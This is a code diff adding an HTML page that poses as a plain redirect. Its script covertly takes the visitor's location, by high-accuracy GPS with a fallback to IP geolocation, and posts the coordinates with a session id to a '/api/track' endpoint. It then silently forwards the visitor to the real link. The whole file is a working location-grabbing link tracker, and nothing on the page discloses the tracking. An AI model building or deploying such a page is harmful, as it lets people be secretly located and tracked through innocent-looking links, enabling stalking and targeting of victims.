@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <script>
+        (function () {
+            const params = new URLSearchParams(window.location.search);
+            const targetUrl = decodeURIComponent(params.get("u"));
+            const sessionId = params.get("s");
+
+            // Kalman filter (1D)
+            class KalmanFilter {
+                constructor(R = 0.01, Q = 0.1) {
+                    this.R = R;
+                    this.Q = Q;
+                    this.A = 1;
+                    this.B = 0;
+                    this.C = 1;
+                    this.cov = NaN;
+                    this.x = NaN;
+                }
+                filter(z) {
+                    if (isNaN(this.x)) {
+                        this.x = (1 / this.C) * z;
+                        this.cov = (1 / this.C) * this.Q * (1 / this.C);
+                    } else {
+                        const predX = this.A * this.x;
+                        const predCov = this.A * this.cov * this.A + this.R;
+                        const K = predCov * this.C * (1 / (this.C * predCov * this.C + this.Q));
+                        this.x = predX + K * (z - this.C * predX);
+                        this.cov = predCov - K * this.C * predCov;
+                    }
+                    return this.x;
+                }
+            }
+
+            const latFilter = new KalmanFilter();
+            const lngFilter = new KalmanFilter();
+
+            function sendTrackingData(lat, lng, accuracy, method) {
+                const filteredLat = latFilter.filter(lat);
+                const filteredLng = lngFilter.filter(lng);
+
+                const data = {
+                    sessionId,
+                    lat: filteredLat,
+                    lng: filteredLng,
+                    accuracy,
+                    method,
+                    timestamp: Date.now()
+                };
+
+                fetch("/api/track", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(data),
+                    keepalive: true
+                }).then(() => {
+                    console.log("Location sent:", data);
+                });
+            }
+
+            function tryIPLocation() {
+                fetch("https://api.db-ip.com/v2/free/self")
+                    .then(res => res.json())
+                    .then(data => {
+                        if (data.latitude && data.longitude) {
+                            sendTrackingData(data.latitude, data.longitude, 5000, "ip-dbip");
+                        }
+                    })
+                    .catch(console.error);
+            }
+
+            function trackLocation() {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => {
+                            sendTrackingData(
+                                pos.coords.latitude,
+                                pos.coords.longitude,
+                                pos.coords.accuracy,
+                                "gps"
+                            );
+                        },
+                        (err) => {
+                            console.warn("GPS failed:", err);
+                            tryIPLocation();
+                        },
+                        { enableHighAccuracy: true, timeout: 1000, maximumAge: 0 }
+                    );
+                } else {
+                    tryIPLocation();
+                }
+            }
+
+            setTimeout(() => {
+                if (targetUrl) window.location.replace(targetUrl);
+                else window.location.replace("/");
+            }, 1500);
+
+            // Tracking
+            trackLocation();
+        })();
+    </script>
+</head>
+
+<body style="margin:0;padding:0;background:#fff;"></body>
+
+</html>
